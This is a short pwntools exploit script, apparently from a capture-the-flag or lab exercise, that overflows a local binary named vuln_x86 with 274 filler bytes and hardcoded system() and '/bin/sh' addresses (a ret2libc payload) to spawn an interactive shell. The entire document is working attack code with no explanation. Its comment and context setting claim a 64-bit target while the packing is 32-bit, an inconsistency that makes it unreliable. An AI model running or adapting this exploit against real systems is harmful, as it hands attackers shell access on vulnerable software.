from pwn import *

# tell pwltools we're using 64 bit
context.update(arch="amd64")

p = process("./vuln_x86")

# Payload:
# [filler=>AAAAA... * 274][call system(): 0xf7e0d360][return addr for system()=>bogus][arg_1 for system ("/bin/sh"): 0xf7f57363]

# Junk
payload = b"A" * 274
# call system
payload += p32(0xf7e0d360)
# bogus retn
payload += p32(0xdaddcafe)
# /bin/sh call location
payload += p32(0xf7f57363)

# Attach GDB
#vuln_debug = attach(p, "c", api=True)

p.sendafter(b"Hey, whats your name!?\n", payload)
p.sendafter(b"is this name correct? (y/n)?\n", b"y\n")
p.interactive()
